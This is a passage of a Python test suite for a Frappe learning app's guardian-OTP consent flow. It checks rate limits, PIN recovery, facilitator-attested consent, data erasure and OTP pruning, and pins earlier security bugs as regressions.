			"mobile_hash": api._mobile_hash(api._norm_mobile(self.G2))}))

	def test_recovery_refuses_an_unverified_guardian_number(self):
		"""A number typed into Desk without ever being proven must not become a recovery key
		for whoever controls it today — hence guardian_verified is part of the lookup."""
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		h = api._mobile_hash(api._norm_mobile(self.G1))
		stu = frappe.get_doc({"doctype": "Student", "student_name": "Unproven Guardian Girl",
		                      "active": 1, "gender": "Other", "login_pin": api._hash_pin("1234"),
		                      "guardian_mobile_hash": h, "guardian_mobile_last4": self.G1[-4:],
		                      "guardian_verified": 0}).insert(ignore_permissions=True)
		frappe.db.commit()
		self.assertEqual(api._students_for_guardian(h), [])
		r = api.send_guardian_otp(mobile=self.G1, purpose="recovery")
		self.assertTrue(r.get("ok"))
		self.assertNotIn("code", r)           # treated as "no such family": nothing sent
		self.assertTrue(api._pin_ok(frappe.db.get_value("Student", stu.name, "login_pin"), "1234"))

	# -- 5. it fails closed, and off -------------------------------------------
	def test_every_door_refuses_while_the_feature_is_off(self):
		self._enable_otp(enabled=0)
		for call in (lambda: api.send_guardian_otp(mobile=self.G1),
		             lambda: api.verify_guardian_otp(mobile=self.G1, code="123456"),
		             lambda: api.signup_with_consent(mobile=self.G1, ticket="x", name="N", pin="1234"),
		             lambda: api.reset_pin(mobile=self.G1, ticket="x", student="y", new_pin="1234")):
			self.assertEqual(call().get("error"), "otp_off")
		self.assertFalse(frappe.get_all("Hikmat OTP", filters={
			"mobile_hash": api._mobile_hash(api._norm_mobile(self.G1))}))

	def test_whatsapp_channel_without_a_phone_number_id_is_treated_as_off(self):
		"""Half-configured must not send. Selecting WhatsApp with no phone number ID leaves
		_otp_config returning None rather than attempting a call that cannot work."""
		self._enable_otp(channel="WhatsApp")
		ss = frappe.get_single("Hikmat Settings")
		self.assertFalse((ss.wa_phone_number_id or "").strip(),
		                 "test site unexpectedly has WhatsApp credentials configured")
		self.assertIsNone(api._otp_config())
		self.assertEqual(api.send_guardian_otp(mobile=self.G1).get("error"), "otp_off")

	def test_resend_cooldown_holds(self):
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		self.assertTrue(api.send_guardian_otp(mobile=self.G1).get("ok"))
		second = api.send_guardian_otp(mobile=self.G1)
		self.assertEqual(second.get("error"), "too_soon")

	def test_the_daily_ceiling_holds_and_does_not_burn_on_a_cooldown_refusal(self):
		"""Ordering matters: a guardian tapping resend twice must be stopped by the 60-second
		cooldown WITHOUT spending one of that number's five daily sends."""
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		h = api._mobile_hash(api._norm_mobile(self.G1))
		cool, day = "otpcool:consent:" + h, "otpday:consent:" + h
		self.assertTrue(api.send_guardian_otp(mobile=self.G1).get("ok"))
		for _ in range(3):
			self.assertEqual(api.send_guardian_otp(mobile=self.G1).get("error"), "too_soon")
		self.assertEqual(api._rate_state(day)[0], 1)               # still just the one send
		for _ in range(api._OTP_PER_NUMBER_DAY - 1):
			api._rate_reset(cool)
			self.assertTrue(api.send_guardian_otp(mobile=self.G1).get("ok"))
		api._rate_reset(cool)
		self.assertEqual(api.send_guardian_otp(mobile=self.G1).get("error"), "rate_limited")

	def test_an_enrolment_flood_cannot_spend_a_girls_recovery_allowance(self):
		"""The day budget used to be keyed on the number ALONE, so five guest POSTs asking to
		enrol spent the exact five sends a girl needs to recover her forgotten PIN — for 24
		hours, repeatable daily, against any number an attacker happens to know."""
		self._reset_buckets(self.G1)
		girl = self._enrol(self.G1, "Reserved Recovery Girl")
		h = api._mobile_hash(api._norm_mobile(self.G1))
		for _ in range(api._OTP_PER_NUMBER_DAY):                   # burn consent entirely
			api._rate_reset("otpcool:consent:" + h)
			api.send_guardian_otp(mobile=self.G1, purpose="consent")
		api._rate_reset("otpcool:consent:" + h)
		self.assertEqual(api.send_guardian_otp(mobile=self.G1, purpose="consent").get("error"),
		                 "rate_limited")
		# ...and she can still get her PIN back
		r = self._send(self.G1, "recovery")
		self.assertTrue(r.get("ok"), r)
		self.assertIn("code", r)
		self.assertTrue(girl["id"])

	def test_a_facilitator_can_release_a_familys_send_ceilings(self):
		"""A per-number ceiling is only tolerable if somebody can lift it on the spot — the
		number is not a secret, so anyone who knows it can spend a family's day of sends."""
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		h = api._mobile_hash(api._norm_mobile(self.G1))
		for _ in range(api._OTP_PER_NUMBER_DAY):
			api._rate_reset("otpcool:recovery:" + h)
			api.send_guardian_otp(mobile=self.G1, purpose="recovery")
		api._rate_reset("otpcool:recovery:" + h)
		self.assertEqual(api.send_guardian_otp(mobile=self.G1, purpose="recovery").get("error"),
		                 "rate_limited")
		out = api.clear_login_lockout(mobile=self.G1)
		self.assertTrue(out.get("ok"), out)
		self.assertTrue(api.send_guardian_otp(mobile=self.G1, purpose="recovery").get("ok"))

	def test_releasing_ceilings_rejects_a_junk_number(self):
		self.assertEqual(api.clear_login_lockout(mobile="12345").get("error"), "bad_mobile")

	def test_console_codes_are_fenced_to_a_dev_bench(self):
		"""The Console channel must never hand a real site its codes. in_test is true here,
		so the fence is asserted on the predicate directly."""
		self.assertTrue(api._console_ok())
		old_dev, old_test = frappe.conf.get("developer_mode"), frappe.flags.in_test
		try:
			frappe.conf.developer_mode = 0
			frappe.flags.in_test = False
			self.assertFalse(api._console_ok())
		finally:
			frappe.conf.developer_mode = old_dev
			frappe.flags.in_test = old_test

	# -- 6. the facilitator route ----------------------------------------------
	def test_facilitator_recorded_consent_is_marked_as_attested(self):
		"""The only route open to a family whose guardian has no smartphone — WhatsApp cannot
		reach them, and refusing them a verified profile would make the consent gate a wealth
		filter. The record says HOW it was verified, so an auditor can tell an attested
		consent from a device-proven one."""
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		stu = frappe.get_doc({"doctype": "Student", "student_name": "Feature Phone Girl",
		                      "active": 1, "gender": "Other"}).insert(ignore_permissions=True)
		self.addCleanup(lambda: frappe.db.delete("Hikmat Consent", {"student": stu.name}))
		r = api.record_guardian_consent(student=stu.name, mobile=self.G1,
		                                note="Met her mother at the centre; she agreed.")
		self.assertTrue(r.get("ok"), r)
		con = frappe.get_all("Hikmat Consent", filters={"student": stu.name},
		                     fields=["channel", "guardian_mobile_last4", "otp",
		                             "attested_note", "withdrawn_note", "withdrawn_on"])[0]
		self.assertEqual(con.channel, "Facilitator")
		# The note is the ATTESTATION, on its own field. It used to be written into
		# withdrawn_note, which showed an auditor a withdrawal note on a consent nobody had
		# withdrawn — and, being a post-insert re-query for "the newest row", could land on a
		# different row than the one just filed.
		self.assertIn("Met her mother", con.attested_note or "")
		self.assertFalse(con.withdrawn_note)
		self.assertFalse(con.withdrawn_on)
		self.assertEqual(con.guardian_mobile_last4, self.G1[-4:])
		self.assertFalse(con.otp)                       # no challenge — that is the point
		self.assertTrue(frappe.db.get_value("Student", stu.name, "guardian_verified"))
		# and it is recoverable, so those families get PIN recovery too
		self.assertEqual([s.name for s in api._students_for_guardian(
			api._mobile_hash(api._norm_mobile(self.G1)))], [stu.name])

	def test_recording_consent_is_staff_only(self):
		stu = frappe.get_doc({"doctype": "Student", "student_name": "Staff Gate OTP Girl",
		                      "active": 1, "gender": "Other"}).insert(ignore_permissions=True)
		self.addCleanup(lambda: frappe.db.delete("Student", {"name": stu.name}))
		frappe.db.commit()
		frappe.set_user("Guest")
		self.assertRaises(frappe.PermissionError, api.record_guardian_consent, stu.name)
		frappe.set_user("Administrator")
		self.assertFalse(frappe.db.get_value("Student", stu.name, "guardian_verified"))

	def test_erasing_a_learner_erases_her_consent_record_and_her_name_with_it(self):
		"""Right-to-erasure, and a Play requirement: "delete my data" must actually remove the
		associated data. The consent row denormalises student_name, so omitting it from
		_LEARNER_DOCTYPES left a child's NAME behind after an erasure that reported success —
		the precise residue the rest of that machinery exists to remove."""
		self._reset_buckets(self.G1)
		girl = self._enrol(self.G1, "Erase Consent Girl")
		h = api._mobile_hash(api._norm_mobile(self.G1))
		self.assertTrue(frappe.get_all("Hikmat Consent", filters={"student": girl["id"]}))
		r = api.delete_student(girl["id"])
		self.assertTrue(r.get("ok"), r)
		self.assertFalse(frappe.db.exists("Student", girl["id"]))
		self.assertFalse(frappe.get_all("Hikmat Consent", filters={"student": girl["id"]}))
		# her name must not survive anywhere in the consent table, by any route
		self.assertFalse(frappe.get_all("Hikmat Consent",
		                                filters={"student_name": "Erase Consent Girl"}))
		# challenges tied to her by link are gone; the enrolment one (student is unset, and it
		# holds no name and no number) is left to the pruner — see _LEARNER_DOCTYPES.
		self.assertFalse(frappe.get_all("Hikmat OTP", filters={"student": girl["id"]}))
		for row in frappe.get_all("Hikmat OTP", filters={"mobile_hash": h},
		                          fields=["purpose", "student"]):
			self.assertEqual(row.purpose, "Consent")
			self.assertFalse(row.student)

	def test_erasure_resumes_when_only_a_consent_row_is_left_behind(self):
		"""_erasure_residue drives the "finish a half-done erasure" path, and it iterates the
		same list — so a consent row left by an older code path must make a re-run FINISH
		rather than answer not_found."""
		self._reset_buckets(self.G1)
		girl = self._enrol(self.G1, "Residue Consent Girl")
		frappe.delete_doc("Student", girl["id"], force=1, ignore_permissions=True,
		                  delete_permanently=True)      # the pre-fix erasure: profile only
		frappe.db.commit()
		self.assertTrue(api._erasure_residue(girl["id"]))
		r = api.delete_student(girl["id"])
		self.assertTrue(r.get("ok"), r)
		self.assertTrue(r.get("resumed"))
		self.assertFalse(frappe.get_all("Hikmat Consent", filters={"student": girl["id"]}))

	# -- 7. regressions found by review, each pinned ---------------------------------
	def test_a_devanagari_digit_folds_to_the_same_number(self):
		r"""The bug family this file has been broken by twice: something the attacker can vary
		while attacking the same victim. `re.sub(r"[^\d]", ...)` is UNICODE in Python, so it
		KEPT Devanagari digits, and _MOBILE_RE was `[6-9]\d{9}`, which ACCEPTED them — giving
		one real phone number thousands of spellings, each with its own send budget and its own
		stored hash. A guardian who enrolled from a Hindi keypad could then never be matched by
		the ASCII spelling of her own number, and would never be told why no code arrived."""
		ascii_form = "9876543210"
		deva = "９８７६५४३२१०"                     # fullwidth + Devanagari digits, same number
		mixed = "98765४3210"                       # one Devanagari 4 in the middle
		for spelling in (deva, mixed, "98765 ४3210", "+91 98765४3210"):
			self.assertEqual(api._norm_mobile(spelling), "+91" + ascii_form, spelling)
			self.assertEqual(api._mobile_hash(api._norm_mobile(spelling)),
			                 api._mobile_hash("+91" + ascii_form), spelling)
		# and a non-decimal "digit-like" character is still not a digit
		self.assertEqual(api._norm_mobile("98765④3210"), "")

	def test_a_send_that_failed_cannot_shadow_a_delivered_code(self):
		"""verify used to take the NEWEST live challenge and never looked at sent_ok, so a
		resend whose WhatsApp call failed made the guardian's real, still-valid code answer
		"wrong code" until it expired — while burning its attempts."""
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		good = self._send(self.G1)
		h = api._mobile_hash(api._norm_mobile(self.G1))
		# simulate the next send failing at the gateway: a row exists, sent_ok=0
		frappe.get_doc({"doctype": "Hikmat OTP", "purpose": "Consent", "mobile_hash": h,
		                "mobile_last4": self.G1[-4:], "code_hash": api._hash_pin("999999"),
		                "expires_on": frappe.utils.add_to_date(frappe.utils.now(), minutes=10),
		                "attempts": 0, "sent_ok": 0, "channel": "WhatsApp",
		                "send_error": "HTTP 401: token expired"}).insert(ignore_permissions=True)
		frappe.db.commit()
		# her delivered code still works...
		v = api.verify_guardian_otp(mobile=self.G1, code=good["code"])
		self.assertTrue(v.get("ok"), v)
		# ...and the undelivered one is not usable by anyone
		self.assertEqual(api.verify_guardian_otp(mobile=self.G1, code="999999").get("error"),
		                 "bad_code")

	def test_a_resend_does_not_kill_the_code_already_in_her_hand(self):
		"""Two live codes, both delivered: on 2G she taps "Send it again" and then the FIRST
		message lands. Typing it must work."""
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		h = api._mobile_hash(api._norm_mobile(self.G1))
		first = api.send_guardian_otp(mobile=self.G1)
		api._rate_reset("otpcool:consent:" + h)
		second = api.send_guardian_otp(mobile=self.G1)
		self.assertTrue(first.get("ok") and second.get("ok"))
		self.assertNotEqual(first["code"], second["code"])
		v = api.verify_guardian_otp(mobile=self.G1, code=first["code"])   # the older one
		self.assertTrue(v.get("ok"), v)

	def test_a_resend_does_not_buy_extra_guesses(self):
		"""Widening verify to every live challenge must not widen the guessing budget: five
		wrong codes end the number's attempts however many challenges are outstanding."""
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		h = api._mobile_hash(api._norm_mobile(self.G1))
		a = api.send_guardian_otp(mobile=self.G1)
		api._rate_reset("otpcool:consent:" + h)
		b = api.send_guardian_otp(mobile=self.G1)
		wrong = "000000" if "000000" not in (a["code"], b["code"]) else "111111"
		for _ in range(api._OTP_MAX_ATTEMPTS):
			self.assertEqual(api.verify_guardian_otp(mobile=self.G1, code=wrong).get("error"),
			                 "bad_code")
		for real in (a["code"], b["code"]):
			self.assertEqual(api.verify_guardian_otp(mobile=self.G1, code=real).get("error"),
			                 "bad_code")

	def test_recording_consent_without_a_number_does_not_erase_a_proven_one(self):
		"""_file_consent used to write the hash unconditionally, so filing a paper consent form
		months later ran UPDATE ... SET guardian_mobile_hash = NULL over a number the guardian
		had already proven — silently destroying her only route to a PIN reset, with the uniform
		"if that number is on file..." reply guaranteeing nobody ever found out why."""
		self._reset_buckets(self.G1)
		girl = self._enrol(self.G1, "Keep My Number Girl")
		before = frappe.db.get_value("Student", girl["id"],
		                             ["guardian_mobile_hash", "guardian_mobile_last4"], as_dict=True)
		self.assertTrue(before.guardian_mobile_hash)
		r = api.record_guardian_consent(student=girl["id"], note="Paper form filed.")
		self.assertTrue(r.get("ok"), r)
		after = frappe.db.get_value("Student", girl["id"],
		                            ["guardian_mobile_hash", "guardian_mobile_last4",
		                             "guardian_verified"], as_dict=True)
		self.assertEqual(after.guardian_mobile_hash, before.guardian_mobile_hash)
		self.assertEqual(after.guardian_mobile_last4, before.guardian_mobile_last4)
		self.assertTrue(after.guardian_verified)
		# ...so recovery still finds her
		self.assertIn(girl["id"], [s.name for s in api._students_for_guardian(
			api._mobile_hash(api._norm_mobile(self.G1)))])

	def test_signup_student_is_closed_while_the_gate_is_on(self):
		"""The gate cannot live in the client. `backendLive` is a boot-time latch, so a device
		that booted with no signal shows the OLD tickbox and then reaches a server that IS up —
		creating a real, fully synced Student with no parental consent behind it."""
		self.assertEqual(api.signup_student(name="Ungated Girl", pin="1234").get("error"),
		                 "otp_required")
		self.assertFalse(frappe.db.exists("Student", {"student_name": "Ungated Girl"}))

	def test_signup_student_still_works_when_the_gate_is_off(self):
		"""The refusal must be conditional — with the feature off, the old door is the only one."""
		self._enable_otp(enabled=0)
		self.addCleanup(lambda: frappe.db.delete("Student", {"student_name": "Ungated Off Girl"}))
		r = api.signup_student(name="Ungated Off Girl", pin="1234")
		self.assertTrue(r.get("ok"), r)

	def test_a_half_configured_site_reports_the_gate_as_off(self):
		"""get_settings published the raw tickbox, so "enabled but cannot send" hid the only
		working enrolment path behind a gate that could not open. An expired token is the
		likeliest state of a real deployment months in."""
		self._enable_otp(channel="WhatsApp")            # no phone number id / token on this site
		self.assertIsNone(api._otp_config())
		frappe.cache().delete_value(api.SETTINGS_CACHE_KEY)
		self.addCleanup(frappe.cache().delete_value, api.SETTINGS_CACHE_KEY)
		self.assertFalse(api.get_settings().get("otpEnabled"))
		# ...and with it genuinely usable, it reports on
		self._enable_otp()
		frappe.cache().delete_value(api.SETTINGS_CACHE_KEY)
		self.assertTrue(api.get_settings().get("otpEnabled"))

	def test_reset_pin_is_rate_limited(self):
		"""It changes a credential and was completely unmetered, which is what made the
		membership oracle cheap enough to sweep a roster with."""
		self._reset_buckets(self.G1)
		girl = self._enrol(self.G1, "Metered Reset Girl")
		for _ in range(api._OTP_RESET_PER_NUMBER_HOUR):
			api.reset_pin(mobile=self.G1, ticket="junk", student=girl["id"], new_pin="4321")
		self.assertEqual(api.reset_pin(mobile=self.G1, ticket="junk", student=girl["id"],
		                               new_pin="4321").get("error"), "rate_limited")

	def test_a_failed_reset_does_not_burn_the_ticket(self):
		"""The ticket is found, then checked, then burned only once the request is known good —
		so a guardian whose new PIN was rejected can simply try again."""
		self._reset_buckets(self.G1)
		girl = self._enrol(self.G1, "Retry Reset Girl")
		v = self._ticket(self.G1, "recovery")
		self.assertEqual(api.reset_pin(mobile=self.G1, ticket=v["ticket"], student=girl["id"],
		                               new_pin="12").get("error"), "bad_pin")
		r = api.reset_pin(mobile=self.G1, ticket=v["ticket"], student=girl["id"], new_pin="4321")
		self.assertTrue(r.get("ok"), r)
		self.assertTrue(api.login_by_name(name="Retry Reset Girl", pin="4321").get("ok"))

	def test_pruning_does_not_leave_a_consent_record_unsaveable(self):
		"""prune deletes challenges with a raw DELETE, so it used to leave every consent record
		older than 30 days pointing at a row that no longer existed — and Frappe validates links
		on SAVE, so the next attempt to record a DPDP withdrawal was refused outright, on a
		deployment with no shell to fix it from."""
		self._reset_buckets(self.G1)
		girl = self._enrol(self.G1, "Withdrawable Girl")
		h = api._mobile_hash(api._norm_mobile(self.G1))
		con = frappe.get_all("Hikmat Consent", filters={"student": girl["id"]},
		                     fields=["name", "otp"])[0]
		self.assertTrue(con.otp)
		frappe.db.sql("update `tabHikmat OTP` set creation = %s where mobile_hash = %s",
		              (frappe.utils.add_days(frappe.utils.nowdate(), -(api._OTP_KEEP_DAYS + 5)), h))
		frappe.db.commit()
		api.prune_otp_records()
		self.assertIsNone(frappe.db.get_value("Hikmat Consent", con.name, "otp"))
		# the guardian can now actually withdraw
		doc = frappe.get_doc("Hikmat Consent", con.name)
		doc.withdrawn_on = frappe.utils.now()
		doc.withdrawn_note = "Guardian asked us to stop."
		doc.save(ignore_permissions=True)          # would raise LinkValidationError before
		frappe.db.commit()
		self.assertTrue(frappe.db.get_value("Hikmat Consent", con.name, "withdrawn_on"))

	def test_pruning_drops_old_challenges_but_never_consent(self):
		self._reset_buckets(self.G1)
		girl = self._enrol(self.G1, "Prune Test Girl")
		h = api._mobile_hash(api._norm_mobile(self.G1))
		self.assertTrue(frappe.get_all("Hikmat OTP", filters={"mobile_hash": h}))
		frappe.db.sql("update `tabHikmat OTP` set creation = %s where mobile_hash = %s",
		              (frappe.utils.add_days(frappe.utils.nowdate(), -(api._OTP_KEEP_DAYS + 5)), h))
		frappe.db.commit()
		api.prune_otp_records()
		self.assertFalse(frappe.get_all("Hikmat OTP", filters={"mobile_hash": h}))
		# the proof of permission outlives the challenge that produced it
		self.assertTrue(frappe.get_all("Hikmat Consent", filters={"student": girl["id"]}))

class TestSelfSignupIsOnlineMode(FrappeTestCase):
	"""Student.mode must agree with the door the learner came through.

	The field's default was "Campus" and the self-signup path set only the cohort, so every
	learner who signed herself up through the app was stored as cohort=Online + mode=Campus —
	the same fact recorded two ways, disagreeing. It surfaced as soon as the Play Store testers
	arrived: nine rows reading "Online" under Cohort and "Campus" under Mode.

	Campus is the twenty-six girls a facilitator enters by hand and attaches to a Campus.
	Everyone who arrives through the app is Online.
	"""

	NAME = "Mode Default Girl"

	def setUp(self):
		frappe.db.delete("Student", {"student_name": self.NAME})
		self.addCleanup(frappe.db.delete, "Student", {"student_name": self.NAME})

	def test_self_signup_is_stored_as_online(self):
		r = api.signup_student(name=self.NAME, pin="1234")
		self.assertTrue(r.get("ok"), r)
		stu = frappe.db.get_value("Student", r["id"], ["mode", "cohort", "campus"], as_dict=True)
		self.assertEqual(stu.mode, "Online")
		self.assertEqual(stu.cohort, "Online")      # the two must not disagree again
		self.assertFalse(stu.campus)                # no physical campus behind an app signup

	def test_an_online_learner_is_not_in_a_campus_roster(self):
		"""campus_roster hands out every girl's PIN hash + bearer token for offline login, so an
		internet stranger must never land in one. She was already excluded by the empty `campus`
		filter; assert it against mode too, so the exclusion is not resting on one field."""
		r = api.signup_student(name=self.NAME, pin="1234")
		self.assertTrue(r.get("ok"), r)
		rows = frappe.get_all("Student", filters={"active": 1, "mode": "Campus"},
		                      fields=["name"])
		self.assertNotIn(r["id"], [x.name for x in rows])
